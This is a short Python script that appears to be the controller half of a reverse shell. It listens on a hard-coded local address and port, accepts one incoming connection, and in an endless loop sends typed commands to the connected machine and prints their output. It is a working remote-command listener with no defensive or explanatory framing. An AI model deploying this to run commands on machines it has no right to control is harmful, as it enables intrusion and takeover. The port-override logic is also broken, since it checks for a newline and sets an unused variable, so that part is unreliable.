import socket

#Getting our local IP and a specified port
HOST = '192.168.100.32'
PORT = 8081 # 2222

new_port = input('Enter Host Port (Blank if default): ')
if (new_port != "\n"):
    REMOTE_PORT = new_port

server = socket.socket()
server.bind((HOST, PORT))

#Starting server
print("[+] Server Started")
print("[+] Listening for Client Connection...")
server.listen(1)
client, client_addr = server.accept()
print(f"[+] {client_addr} Client connected to the server!")

#Receiving Commands
while True:
    command = input("Enter Command: ")
    command = command.encode()
    client.send(command)
    print("[+] Command Sent!")
    output = client.recv(1024)
    output = output.decode()
    print(f"Output: {output}")